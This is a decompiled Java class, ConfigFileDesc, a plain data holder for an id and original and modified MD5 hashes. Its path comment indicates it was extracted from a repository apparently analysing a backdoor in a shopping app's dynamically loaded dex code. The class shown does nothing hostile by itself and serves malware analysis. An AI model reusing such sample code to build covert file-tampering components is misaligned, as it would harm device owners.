package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import java.io.Serializable;

public class ConfigFileDesc implements Serializable {
  private int id;
  
  private String modifiedMd5;
  
  private String originMd5;
  
  public ConfigFileDesc(int paramInt, String paramString1, String paramString2) {
    this.id = paramInt;
    this.originMd5 = paramString1;
    this.modifiedMd5 = paramString2;
  }
  
  public int getId() {
    return this.id;
  }
  
  public String getModifiedMd5() {
    return this.modifiedMd5;
  }
  
  public String getOriginMd5() {
    return this.originMd5;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\ConfigFileDesc.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */